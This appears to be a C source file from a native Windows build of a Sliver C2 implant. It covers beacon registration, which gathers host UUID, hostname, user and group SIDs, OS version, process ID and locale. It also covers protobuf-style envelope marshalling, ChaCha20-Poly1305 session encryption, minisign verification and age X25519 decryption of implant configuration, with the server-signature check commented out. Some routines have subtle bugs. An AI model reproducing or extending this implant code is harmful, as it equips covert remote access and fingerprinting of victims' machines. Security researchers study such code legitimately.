#include "pch.h"

VOID FreeEnvelope
(
	_In_ PENVELOPE pEnvelope
)
{
	if (pEnvelope != NULL) {
		if (pEnvelope->pData != NULL) {
			FREE(pEnvelope->pData->pBuffer);
			FREE(pEnvelope->pData);
		}

		FREE(pEnvelope);
	}
}

VOID FreeSliverThreadPool
(
	_In_ PSLIVER_THREADPOOL pSliverPool
)
{
	if (pSliverPool != NULL) {
		if (pSliverPool->pPool != NULL) {
			TpReleasePool(pSliverPool->pPool);
		}

		FREE(pSliverPool);
	}
}

PSLIVER_THREADPOOL InitializeSliverThreadPool(void)
{
	PSLIVER_THREADPOOL pResult = NULL;
	PTP_CLEANUP_GROUP pCleanupGroup = NULL;

	pResult = ALLOC(sizeof(SLIVER_THREADPOOL));
	pResult->pPool = CreateThreadpool(NULL);
	TpSetPoolMaxThreads(pResult->pPool, 8);
	SetThreadpoolCallbackPool(&pResult->CallBackEnviron, pResult->pPool);
	pCleanupGroup = CreateThreadpoolCleanupGroup();
	SetThreadpoolCallbackCleanupGroup(&pResult->CallBackEnviron, pCleanupGroup, NULL);

	return pResult;
}

VOID FreeGlobalConfig
(
	_In_ PGLOBAL_CONFIG pConfig
)
{
	if (pConfig != NULL) {
		FREE(pConfig->pSessionKey);
		FREE(pConfig->pPeerSessionKey);
		FREE(pConfig->lpRecipientPubKey);
		FREE(pConfig->lpPeerPubKey);
		FREE(pConfig->lpPeerPrivKey);
		FREE(pConfig->lpConfigID);
		FREE(pConfig->lpServerMinisignPublicKey);
		FREE(pConfig->lpPeerAgePublicKeySignature);
		FREE(pConfig);
	}
}

PBUFFER RegisterSliver
(
	_In_ PGLOBAL_CONFIG pConfig
)
{
	LPSTR lpUUID = NULL;
	LPSTR lpFullQualifiedName = NULL;
	LPSTR lpUserSid = NULL;
	LPSTR lpGroupSid = NULL;
	SYSTEM_INFO SystemInfo;
	RTL_OSVERSIONINFOW OsVersion;
	LPSTR lpVersion = NULL;
	LPSTR lpHostName = NULL;
	LPSTR lpArch = NULL;
	LPSTR lpModulePath = NULL;
	DWORD cbModulePath = MAX_PATH;
	DWORD dwReturnedLength = 0;
	DWORD dwLastError = 0;
	LPSTR lpLocaleName = NULL;
	WCHAR wszLocale[0x20];
	PBUFFER pResult = NULL;
	DWORD cbResult = 1;
	CHAR szOsName[] = "windows";

	PPBElement pFinalElement = NULL;
	PPBElement ElementList[17];

	lpUUID = GetHostUUID();
	if (lpUUID == NULL) {
		goto CLEANUP;
	}

	lpUUID[lstrlenA(lpUUID) - 1] = '\0';
	lpFullQualifiedName = GetComputerUserName();
	if (lpFullQualifiedName == NULL) {
		goto CLEANUP;
	}

	lpUserSid = GetCurrentProcessUserSID();
	if (lpUserSid == NULL) {
		goto CLEANUP;
	}

	lpGroupSid = GetCurrentProcessGroupSID();
	if (lpGroupSid == NULL) {
		goto CLEANUP;
	}

	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	if (!GetOsVersion(&OsVersion)) {
		LOG_ERROR("GetOsVersion", GetLastError());
		goto CLEANUP;
	}

	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
	GetNativeSystemInfo(&SystemInfo);
	lpVersion = ALLOC(0x100);
	wsprintfA(lpVersion, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
	if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
		lstrcatA(lpVersion, " x86_64");
		lpArch = DuplicateStrA("amd64", 0);
	}
	else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		lstrcatA(lpVersion, " x86");
		lpArch = DuplicateStrA("386", 0);
	}
	else {
		lpArch = DuplicateStrA("(NULL)", 0);
	}

	lpHostName = GetHostName();
	lpModulePath = ALLOC(cbModulePath + 1);
	while (TRUE) {
		SecureZeroMemory(lpModulePath, cbModulePath + 1);
		dwReturnedLength = GetModuleFileNameA(NULL, lpModulePath, cbModulePath);
		dwLastError = GetLastError();
		if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
			cbModulePath *= 2;
			lpModulePath = REALLOC(lpModulePath, cbModulePath + 1);
		}

		break;
	}

	GetSystemDefaultLocaleName(wszLocale, 0x20);
	lpLocaleName = ConvertWcharToChar(wszLocale);
	lpHostName = GetHostName();

	SecureZeroMemory(ElementList, sizeof(ElementList));
	ElementList[0] = CreateBytesElement(pConfig->szSliverName, lstrlenA(pConfig->szSliverName), 1);
	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
	ElementList[4] = CreateBytesElement(lpUserSid, lstrlenA(lpUserSid), 5);
	ElementList[5] = CreateBytesElement(lpGroupSid, lstrlenA(lpGroupSid), 6);
	ElementList[6] = CreateBytesElement(szOsName, lstrlenA(szOsName), 7);
	ElementList[7] = CreateBytesElement(lpArch, lstrlenA(lpArch), 8);
	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
	ElementList[12] = CreateVarIntElement(pConfig->dwReconnectInterval, 13);
	/*if (pSliverClient->HttpConfig.pProxyConfig != NULL && pSliverClient->HttpConfig.pProxyConfig->pUri != NULL) {
		ElementList[13] = CreateBytesElement(pSliverClient->HttpConfig.pProxyConfig->pUri, lstrlenA(pSliverClient->HttpConfig.pProxyConfig->pUri), 14);
	}*/

	ElementList[14] = CreateBytesElement(pConfig->lpConfigID, lstrlenA(pConfig->lpConfigID), 16);
	ElementList[15] = CreateVarIntElement(pConfig->uPeerID, 17);
	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);

	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
	pResult = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	FREE(lpHostName);
	FREE(lpUUID);
	FREE(lpFullQualifiedName);
	FREE(lpUserSid);
	FREE(lpGroupSid);
	FREE(lpArch);
	FREE(lpModulePath);
	FREE(lpVersion);
	FREE(lpLocaleName);
	FreeElement(pFinalElement);

	return pResult;
}

PBUFFER MarshalEnvelope
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement ElementList[4];
	DWORD i = 0;
	PBUFFER pResult = NULL;
	PPBElement pTemp = NULL;

	SecureZeroMemory(ElementList, sizeof(ElementList));
	if (pEnvelope->uID != 0) {
		ElementList[0] = CreateVarIntElement(pEnvelope->uID, 1);
	}

	if (pEnvelope->uType > 0) {
		ElementList[1] = CreateVarIntElement(pEnvelope->uType, 2);
	}

	if (!pEnvelope->uUnknownMessageType) {
		if (pEnvelope->pData != NULL) {
			ElementList[2] = CreateBytesElement(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, 3);
		}
	}
	else {
		ElementList[3] = CreateVarIntElement(TRUE, 4);
	}

	pResult = ALLOC(sizeof(BUFFER));
	pTemp = CreateStructElement(ElementList, 4, 0);
	if (pTemp->SubElements != NULL) {
		for (i = 0; i < pTemp->dwNumberOfSubElement; i++) {
			FreeElement(pTemp->SubElements[i]);
		}

		FREE(pTemp->SubElements);
	}

	pResult = BufferMove(pTemp->pMarshaledData, pTemp->cbMarshaledData);
	pTemp->pMarshaledData = NULL;
	FreeElement(pTemp);
	return pResult;
}

PENVELOPE UnmarshalEnvelope
(
	_In_ PBUFFER pData
)
{
	PPBElement ElementList[4];
	DWORD i = 0;
	PENVELOPE pResult = NULL;

	SecureZeroMemory(ElementList, sizeof(ElementList));
	for (i = 0; i < _countof(ElementList); i++) {
		ElementList[i] = ALLOC(sizeof(PBElement));
		ElementList[i]->dwFieldIdx = i + 1;
	}

	ElementList[0]->Type = Varint;
	ElementList[1]->Type = Varint;
	ElementList[2]->Type = Bytes;
	ElementList[3]->Type = Varint;

	pResult = UnmarshalStruct(ElementList, _countof(ElementList), pData->pBuffer, pData->cbBuffer, NULL);
	for (i = 0; i < _countof(ElementList); i++) {
		FREE(ElementList[i]);
	}

	return pResult;
}

PENVELOPE CreateErrorRespEnvelope
(
	_In_ LPSTR lpErrorDesc,
	_In_ DWORD dwFieldIdx,
	_In_ UINT64 uEnvelopeID
)
{
	DWORD cbMarshaledFieldIdx = 0;
	PENVELOPE pResult = NULL;
	PPBElement RespElement;
	PPBElement FinalElement;
	PPBElement ElementList[4];

	SecureZeroMemory(ElementList, sizeof(ElementList));
	ElementList[0] = CreateBytesElement(lpErrorDesc, lstrlenA(lpErrorDesc), 1);
	RespElement = CreateStructElement(ElementList, _countof(ElementList), dwFieldIdx);
	FinalElement = CreateStructElement(&RespElement, 1, 0);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->pData = BufferMove(FinalElement->pMarshaledData, FinalElement->cbMarshaledData);
	FinalElement->pMarshaledData = NULL;
	pResult->uID = uEnvelopeID;
	
	FreeElement(ElementList[0]);
	FreeElement(FinalElement);

	return pResult;
}

//PBUFFER SliverBase64Decode
//(
//	_In_ LPSTR lpInput
//)
//{
//	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
//	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
//	LPSTR lpTemp = NULL;
//	DWORD cbInput = lstrlenA(lpInput);
//	DWORD i = 0;
//	lpTemp = ALLOC(cbInput + 1);
//	DWORD dwPos = 0;
//	PBUFFER pResult = NULL;
//
//	for (i = 0; i < cbInput; i++) {
//		dwPos = StrChrA(szNewCharSet, lpInput[i]) - szNewCharSet;
//		lpTemp[i] = szOldCharSet[dwPos];
//	}
//
//	pResult = ALLOC(sizeof(BUFFER));
//	pResult->pBuffer = Base64Decode(lpTemp, &pResult->cbBuffer);
//	FREE(lpTemp);
//	return pResult;
//}

PBUFFER SliverEncrypt
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PBUFFER pInput,
	_In_ BOOL SendToServer
)
{
	BYTE Nonce[CHACHA20_NONCE_SIZE];
	PBUFFER pResult = NULL;
	PBYTE pSessionKey = NULL;

	SecureZeroMemory(Nonce, sizeof(Nonce));
	pResult = ALLOC(sizeof(BUFFER));
	if (SendToServer) {
		pSessionKey = pConfig->pSessionKey;
	}
	else {
		pSessionKey = pConfig->pPeerSessionKey;
	}

	Chacha20Poly1305Encrypt(pSessionKey, Nonce, pInput->pBuffer, pInput->cbBuffer, NULL, 0, &pResult->pBuffer, &pResult->cbBuffer);
	pResult->pBuffer = REALLOC(pResult->pBuffer, pResult->cbBuffer + CHACHA20_NONCE_SIZE);
	memcpy(pResult->pBuffer + CHACHA20_NONCE_SIZE, pResult->pBuffer, pResult->cbBuffer);
	memcpy(pResult->pBuffer, Nonce, CHACHA20_NONCE_SIZE);
	pResult->cbBuffer += CHACHA20_NONCE_SIZE;

	return pResult;
}

PBUFFER SliverDecrypt
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PBUFFER pCipherText,
	_In_ BOOL FromServer
)
{
	PBUFFER pResult = NULL;
	PMINISIGN_PUB_KEY pDecodedPubKey = NULL;
	PBYTE pTemp = NULL;
	PBYTE pNonce = NULL;
	DWORD cbCipherText = 0;
	BOOL IsOk = FALSE;
	PBYTE pSessionKey = NULL;

	/*if (pCipherText->cbBuffer < MINISIGN_SIZE + 1) {
		goto CLEANUP;
	}

	pDecodedPubKey = DecodeMinisignPublicKey(pConfig->lpServerMinisignPublicKey);
	if (pDecodedPubKey == NULL) {
		goto CLEANUP;
	}

	pTemp = pCipherText->pBuffer;
	if (!VerifySign(pDecodedPubKey, pTemp, pCipherText->cbBuffer, FALSE)) {
		goto CLEANUP;
	}

	pNonce = pTemp + MINISIGN_SIZE;*/
	pTemp = pCipherText->pBuffer;
	pNonce = pTemp;
	pTemp = pNonce + CHACHA20_NONCE_SIZE;
	//cbCipherText = pCipherText->cbBuffer - MINISIGN_SIZE - CHACHA20_NONCE_SIZE;
	cbCipherText = pCipherText->cbBuffer - CHACHA20_NONCE_SIZE;
	if (FromServer) {
		pSessionKey = pConfig->pSessionKey;
	}
	else {
		pSessionKey = pConfig->pPeerSessionKey;
	}

	pResult = Chacha20Poly1305DecryptAndVerify(pSessionKey, pNonce, pTemp, cbCipherText, NULL, 0);
	if (pResult->pBuffer == NULL || pResult->cbBuffer == 0) {
		goto CLEANUP;
	}

	IsOk = TRUE;
CLEANUP:
	if (!IsOk) {
		FreeBuffer(pResult);
		pResult = NULL;
	}

	//FREE(pDecodedPubKey);

	return pResult;
}

PSIGNATURE DecodeMinisignSignature
(
	_In_ LPSTR lpInput
)
{
	LPSTR* SplitArray = NULL;
	DWORD cSplitArray = 0;
	PSIGNATURE pResult = NULL;
	PBUFFER pBuffer1 = NULL;
	PBUFFER pBuffer2 = NULL;

	SplitArray = StrSplitNA(lpInput, "\n", 0, &cSplitArray);
	if (cSplitArray < 4) {
		goto CLEANUP;
	}

	pBuffer1 = Base64Decode(SplitArray[1]);
	if (pBuffer1->cbBuffer != 74) {
		goto CLEANUP;
	}

	pBuffer2 = Base64Decode(SplitArray[3]);
	if (pBuffer2->cbBuffer != 64) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(SIGNATURE));
	pResult->lpUntrustedComment = SplitArray[0];
	pResult->lpTrustedComment = SplitArray[2];
	
	memcpy(pResult->SignatureAlgorithm, pBuffer1->pBuffer, pBuffer1->cbBuffer);
	memcpy(pResult->GlobalSignature, pBuffer2->pBuffer, pBuffer2->cbBuffer);
CLEANUP:
	FREE(SplitArray[1]);
	FREE(SplitArray[3]);
	FREE(SplitArray);
	FreeBuffer(pBuffer1);
	FreeBuffer(pBuffer2);

	return pResult;
}

BOOL VerifySign
(
	_In_ PMINISIGN_PUB_KEY pPublicKey,
	_In_ PSIGNATURE pSig,
	_In_ PBUFFER pMessage
)
{
	BOOL Result = FALSE;
	BOOL PreHashed = FALSE;
	PBYTE pBlake2Digest = NULL;
	PBYTE pTemp = NULL;
	DWORD cbTemp = 0;

	if (pPublicKey->SignatureAlgorithm[0] != 'E' && pPublicKey->SignatureAlgorithm[1] != 'd') {
		goto CLEANUP;
	}

	if (pSig->SignatureAlgorithm[0] == 0x45 && pSig->SignatureAlgorithm[1] == 0x64) {
		PreHashed = FALSE;
	}
	else if (pSig->SignatureAlgorithm[0] == 0x45 && pSig->SignatureAlgorithm[1] == 0x44) {
		PreHashed = TRUE;
	}
	else {
		goto CLEANUP;
	}

	if (memcmp(pPublicKey->KeyId, pSig->KeyId, sizeof(pPublicKey->KeyId))) {
		goto CLEANUP;
	}

	if (!IsStrStartsWithA(pSig->lpTrustedComment, "trusted comment: ")) {
		goto CLEANUP;
	}

	if (PreHashed) {
		pBlake2Digest = Blake2B(pMessage->pBuffer, pMessage->cbBuffer, NULL, 0);
		Result = ED25519Verify(pSig->Signature, pBlake2Digest, 64, pPublicKey->PublicKey);
	}
	else {
		Result = ED25519Verify(pSig->Signature, pMessage->pBuffer, pMessage->cbBuffer, pPublicKey->PublicKey);
	}

	if (!Result) {
		goto CLEANUP;
	}

	cbTemp = sizeof(pSig->Signature) + lstrlenA(pSig->lpTrustedComment) - 17;
	pTemp = ALLOC(cbTemp);
	memcpy(pTemp, pSig->Signature, sizeof(pSig->Signature));
	memcpy(pTemp + sizeof(pSig->Signature), &pSig->lpTrustedComment[17], cbTemp - sizeof(pSig->Signature));
	Result = ED25519Verify(pSig->GlobalSignature, pTemp, cbTemp, pPublicKey->PublicKey);
CLEANUP:
	FREE(pTemp);
	FREE(pBlake2Digest);

	return Result;
}

BOOL MinisignVerify
(
	_In_ PBUFFER pMessage,
	_In_ LPSTR lpSignature,
	_In_ LPSTR lpMinisignServerPublicKey
)
{
	PMINISIGN_PUB_KEY pServerPubKey = NULL;
	BOOL Result = FALSE;
	PSIGNATURE pSig = NULL;

	pServerPubKey = DecodeMinisignPublicKey(lpMinisignServerPublicKey);
	if (pServerPubKey == NULL) {
		goto CLEANUP;
	}

	pSig = DecodeMinisignSignature(lpSignature);
	if (pSig == NULL) {
		goto CLEANUP;
	}

	Result = VerifySign(pServerPubKey, pSig, pMessage);
CLEANUP:
	FREE(pServerPubKey);
	if (pSig != NULL) {
		FREE(pSig->lpTrustedComment);
		FREE(pSig->lpUntrustedComment);
		FREE(pSig);
	}

	return Result;
}

PX25519_IDENTITY AgeParseX25519Identity
(
	_In_ LPSTR lpRecipientPrivateKey
)
{
	CHAR szHrp[0x20];
	PBYTE pDecodedKey = NULL;
	DWORD cbDecodedKey = 0;
	PX25519_IDENTITY pResult = NULL;
	BYTE BasePoint[] = { 0x9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
	PBYTE pOurPubKey = NULL;

	SecureZeroMemory(szHrp, sizeof(szHrp));
	Bech32Decode(szHrp, &pDecodedKey, &cbDecodedKey, lpRecipientPrivateKey);
	if (lstrcmpA(szHrp, "age-secret-key-")) {
		goto CLEANUP;
	}

	if (cbDecodedKey != X25519_SCALAR_SIZE) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(X25519_IDENTITY));
	pResult->pOurPublicKey = ALLOC(X25519_SHARED_SIZE);
	pResult->pSecretKey = pDecodedKey;
	ComputeX25519(pResult->pOurPublicKey, pDecodedKey, BasePoint);
	pDecodedKey = NULL;
CLEANUP:
	return pResult;
}

PSTANZA_WRAPPER ParseStanza
(
	_In_ PBYTE pInputBuffer,
	_In_ DWORD cbBuffer
)
{
	BOOL IsOk = TRUE;
	PSTANZA_WRAPPER pResult = NULL;
	DWORD dwPos = 0;
	CHAR szLine[0x400];
	DWORD cchLine = 0;
	LPSTR lpTemp = NULL;
	CHAR szFooterPrefix[] = "---";
	CHAR szStanzaPrefix[] = "->";
	DWORD dwArgc = 0;
	LPSTR* pArgs = NULL;
	DWORD i = 0;
	DWORD j = 0;
	PSTANZA pStanza = NULL;
	PBUFFER pDecodedData = NULL;

	lpTemp = StrChrA(pInputBuffer, '\n');
	dwPos = lpTemp - pInputBuffer + 1;
	memcpy(szLine, pInputBuffer, dwPos);
	szLine[dwPos] = '\0';
	if (lstrcmpA(szLine, "age-encryption.org/v1\n")) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(STANZA_WRAPPER));
	while (TRUE) {
		memcpy(szLine, pInputBuffer + dwPos, lstrlenA(szFooterPrefix));
		szLine[lstrlenA(szFooterPrefix)] = '\0';
		if (IsStrStartsWithA(szLine, szFooterPrefix)) {
			lpTemp = StrChrA(pInputBuffer + dwPos, '\n');
			cchLine = lpTemp - pInputBuffer - dwPos + 1;
			memcpy(szLine, pInputBuffer + dwPos, cchLine);
			szLine[cchLine - 1] = '\0';
			dwPos += cchLine;

			pArgs = StrSplitNA(szLine, " ", 0, &dwArgc);
			if (lstrcmpA(pArgs[0], szFooterPrefix) || dwArgc != 2) {
				for (i = 0; i < dwArgc; i++) {
					FREE(pArgs[i]);
				}

				FREE(pArgs);
				IsOk = FALSE;
				goto CLEANUP;
			}

			pResult->pMac = Base64Decode(pArgs[1]);
			break;
		}

		lpTemp = StrChrA(pInputBuffer + dwPos, '\n');
		cchLine = lpTemp - pInputBuffer - dwPos + 1;
		memcpy(szLine, pInputBuffer + dwPos, cchLine);
		szLine[cchLine - 1] = '\0';
		dwPos += cchLine;
		if (!IsStrStartsWithA(szLine, szStanzaPrefix)) {
			IsOk = FALSE;
			goto CLEANUP;
		}

		pArgs = StrSplitNA(szLine, " ", 0, &dwArgc);
		if (lstrcmpA(pArgs[0], szStanzaPrefix) || dwArgc < 3) {
			for (i = 0; i < dwArgc; i++) {
				FREE(pArgs[i]);
			}

			FREE(pArgs);
			IsOk = FALSE;
			goto CLEANUP;
		}

		pStanza = ALLOC(sizeof(STANZA));
		pStanza->lpType = pArgs[1];
		pStanza->pArgs = ALLOC(sizeof(LPSTR) * (dwArgc - 2));
		pStanza->dwArgc = dwArgc - 2;
		for (i = 2; i < dwArgc; i++) {
			pStanza->pArgs[i - 2] = pArgs[i];
		}

		FREE(pArgs);
		while (TRUE) {
			lpTemp = StrChrA(pInputBuffer + dwPos, '\n');
			cchLine = lpTemp - pInputBuffer - dwPos + 1;
			memcpy(szLine, pInputBuffer + dwPos, cchLine);
			szLine[cchLine - 1] = '\0';
			dwPos += cchLine;

			pDecodedData = Base64Decode(szLine);
			if (pDecodedData == NULL || pDecodedData->cbBuffer > 48) {
				IsOk = FALSE;
				goto CLEANUP;
			}

			if (pStanza->pBody == NULL) {
				pStanza->pBody = ALLOC(pDecodedData->cbBuffer);
			}
			else {
				pStanza->pBody = REALLOC(pStanza->pBody, pStanza->cbBody + pDecodedData->cbBuffer);
			}

			memcpy(pStanza->pBody + pStanza->cbBody, pDecodedData->pBuffer, pDecodedData->cbBuffer);
			pStanza->cbBody += pDecodedData->cbBuffer;
			if (pDecodedData->cbBuffer < 48) {
				FreeBuffer(pDecodedData);
				break;
			}

			FreeBuffer(pDecodedData);
		}

		if (pResult->Recipients != NULL) {
			pResult->Recipients = REALLOC(pResult->Recipients, (pResult->cRecipients + 1) * sizeof(PSTANZA));
		}
		else {
			pResult->Recipients = ALLOC(sizeof(PSTANZA));
		}

		pResult->Recipients[pResult->cRecipients++] = pStanza;
	}

	pResult->pPayload = ALLOC(sizeof(BUFFER));
	pResult->pPayload->cbBuffer = cbBuffer - dwPos;
	pResult->pPayload->pBuffer = ALLOC(pResult->pPayload->cbBuffer);
	memcpy(pResult->pPayload->pBuffer, &pInputBuffer[dwPos], pResult->pPayload->cbBuffer);
CLEANUP:
	if (!IsOk && pResult != NULL) {
		FreeBuffer(pResult->pMac);
		if (pResult->Recipients != NULL) {
			for (i = 0; i < pResult->cRecipients; i++) {
				FreeStanza(pResult->Recipients[i]);
			}

			FREE(pResult->Recipients);
		}

		FREE(pResult);
		pResult = NULL;
	}

	return pResult;
}

PBYTE MarshalWithoutMAC
(
	_In_ PSTANZA_WRAPPER pHdr,
	_In_ PBYTE pHmacKey
)
{
	PBYTE pResult = NULL;
	CHAR szIntro[] = "age-encryption.org/v1\n";
	CHAR szStanzaPrefix[] = "->";
	LPSTR lpBuffer = NULL;
	DWORD i = 0;
	DWORD j = 0;
	PSTANZA pRecipient = NULL;
	LPSTR pEncodedBody = NULL;

	lpBuffer = DuplicateStrA(szIntro, 0);
	for (i = 0; i < pHdr->cRecipients; i++) {
		pRecipient = pHdr->Recipients[i];
		lpBuffer = StrCatExA(lpBuffer, szStanzaPrefix);
		lpBuffer = StrCatExA(lpBuffer, " ");
		lpBuffer = StrCatExA(lpBuffer, pRecipient->lpType);
		for (j = 0; j < pRecipient->dwArgc; j++) {
			lpBuffer = StrCatExA(lpBuffer, " ");
			lpBuffer = StrCatExA(lpBuffer, pRecipient->pArgs[j]);
		}

		lpBuffer = StrCatExA(lpBuffer, "\n");
		pEncodedBody = Base64Encode(pRecipient->pBody, pRecipient->cbBody, TRUE);
		for (j = 0; j < lstrlenA(pEncodedBody) / 64; j++) {
			lpBuffer = REALLOC(lpBuffer, lstrlenA(lpBuffer) + 66);
			memcpy(lpBuffer + lstrlenA(lpBuffer), &pEncodedBody[j * 64], 64);
			lstrcatA(lpBuffer, "\n");
		}

		lpBuffer = StrCatExA(lpBuffer, &pEncodedBody[j * 64]);
		lpBuffer = StrCatExA(lpBuffer, "\n");
		FREE(pEncodedBody);
	}

	lpBuffer = StrCatExA(lpBuffer, "---");
	pResult = GenerateHmacSHA256(pHmacKey, SHA256_HASH_SIZE, lpBuffer, lstrlenA(lpBuffer));
CLEANUP:
	FREE(lpBuffer);

	return pResult;
}

PBYTE HeaderMAC
(
	_In_ PSTANZA_WRAPPER pHdr,
	_In_ PBYTE pFileKey,
	_In_ DWORD cbFileKey
)
{
	CHAR szInfo[] = "header";
	PBYTE pHmacKey = NULL;
	PBYTE pResult = NULL;

	pHmacKey = HKDFGenerate(NULL, 0, pFileKey, cbFileKey, szInfo, lstrlenA(szInfo), SHA256_HASH_SIZE);
	pResult = MarshalWithoutMAC(pHdr, pHmacKey);
	FREE(pHmacKey);

	return pResult;
}

PBUFFER AgeDecrypt
(
	_In_ LPSTR lpRecipientPrivateKey,
	_In_ PBUFFER pCipherText
)
{
	PBUFFER pResult = NULL;
	PX25519_IDENTITY pX25519Identity = NULL;
	CHAR szAgeMsgPrefix[] = "age-encryption.org/v1\n-> X25519 ";
	CHAR szInfo[] = "age-encryption.org/v1/X25519";
	CHAR szInfo2[] = "payload";
	PBYTE pTempBuffer = NULL;
	DWORD cbTempBuffer = 0;
	PSTANZA_WRAPPER pStanzaList = NULL;
	DWORD i = 0;
	DWORD j = 0;
	BYTE SharedSecret[X25519_SHARED_SIZE];
	PBUFFER pPublicKey = NULL;
	PSTANZA pStanza = NULL;
	PBYTE pSalt = NULL;
	PBYTE pWrappingKey = NULL;
	BYTE Chacha20Nonce[CHACHA20_NONCE_SIZE];
	BYTE HkdfSalt[16];
	PBUFFER pFileKey = NULL;
	PBYTE pMac = NULL;
	PBYTE pChacha20Key = NULL;

	if (pCipherText->cbBuffer < 24) {
		goto CLEANUP;
	}

	if (!IsStrStartsWithA(lpRecipientPrivateKey, "AGE-SECRET-KEY-1")) {
		goto CLEANUP;
	}

	pX25519Identity = AgeParseX25519Identity(lpRecipientPrivateKey);
	cbTempBuffer = lstrlenA(szAgeMsgPrefix) + pCipherText->cbBuffer;
	pTempBuffer = ALLOC(cbTempBuffer);
	lstrcpyA(pTempBuffer, szAgeMsgPrefix);
	memcpy(pTempBuffer + lstrlenA(szAgeMsgPrefix), pCipherText->pBuffer, pCipherText->cbBuffer);
	pStanzaList = ParseStanza(pTempBuffer, cbTempBuffer);
	if (pStanzaList == NULL || pStanzaList->cRecipients < 1) {
		goto CLEANUP;
	}

	pStanza = pStanzaList->Recipients[0];
	if (pStanza->dwArgc != 1) {
		goto CLEANUP;
	}

	pPublicKey = Base64Decode(pStanza->pArgs[0]);
	SecureZeroMemory(SharedSecret, sizeof(SharedSecret));
	ComputeX25519(SharedSecret, pX25519Identity->pSecretKey, pPublicKey->pBuffer);
	pSalt = ALLOC(2 * X25519_KEY_SIZE);
	memcpy(pSalt, pPublicKey->pBuffer, X25519_KEY_SIZE);
	memcpy(pSalt + X25519_KEY_SIZE, pX25519Identity->pOurPublicKey, X25519_KEY_SIZE);
	pWrappingKey = HKDFGenerate(pSalt, 2 * X25519_KEY_SIZE, SharedSecret, sizeof(SharedSecret), szInfo, lstrlenA(szInfo), CHACHA20_KEY_SIZE);
	if (pWrappingKey == NULL) {
		goto CLEANUP;
	}

	SecureZeroMemory(Chacha20Nonce, sizeof(Chacha20Nonce));
	pFileKey = Chacha20Poly1305DecryptAndVerify(pWrappingKey, Chacha20Nonce, pStanza->pBody, pStanza->cbBody, NULL, 0);
	pMac = HeaderMAC(pStanzaList, pFileKey->pBuffer, pFileKey->cbBuffer);
	if (pMac == NULL) {
		goto CLEANUP;
	}

	if (memcmp(pStanzaList->pMac->pBuffer, pMac, SHA256_HASH_SIZE)) {
		goto CLEANUP;
	}

	memcpy(HkdfSalt, pStanzaList->pPayload->pBuffer, sizeof(HkdfSalt));
	pChacha20Key = HKDFGenerate(HkdfSalt, sizeof(HkdfSalt), pFileKey->pBuffer, pFileKey->cbBuffer, szInfo2, lstrlenA(szInfo2), CHACHA20_KEY_SIZE);
	Chacha20Nonce[sizeof(Chacha20Nonce) - 1] = 1;
	pResult = Chacha20Poly1305DecryptAndVerify(pChacha20Key, Chacha20Nonce, pStanzaList->pPayload->pBuffer + sizeof(HkdfSalt), pStanzaList->pPayload->cbBuffer - sizeof(HkdfSalt), NULL, 0);
CLEANUP:
	if (pX25519Identity != NULL) {
		FREE(pX25519Identity->pOurPublicKey);
		FREE(pX25519Identity->pSecretKey);
		FREE(pX25519Identity);
	}

	if (pStanzaList != NULL) {
		FreeBuffer(pStanzaList->pMac);
		FreeBuffer(pStanzaList->pPayload);
		if (pStanzaList->Recipients != NULL) {
			for (i = 0; i < pStanzaList->cRecipients; i++) {
				FreeStanza(pStanzaList->Recipients[i]);
			}

			FREE(pStanzaList->Recipients);
		}

		FREE(pStanzaList);
	}

	FREE(pWrappingKey);
	FREE(pSalt);
	FreeBuffer(pFileKey);
	FREE(pTempBuffer);
	FREE(pMac);
	FREE(pChacha20Key);
	FreeBuffer(pPublicKey);

	return pResult;
}

UINT64 GeneratePeerID()
{
	UINT64 uResult = 0;
	PBYTE pRandomBytes = NULL;

	pRandomBytes = GenRandomBytes(sizeof(uResult));
	memcpy(&uResult, pRandomBytes, sizeof(uResult));
	FREE(pRandomBytes);

	return uResult;
}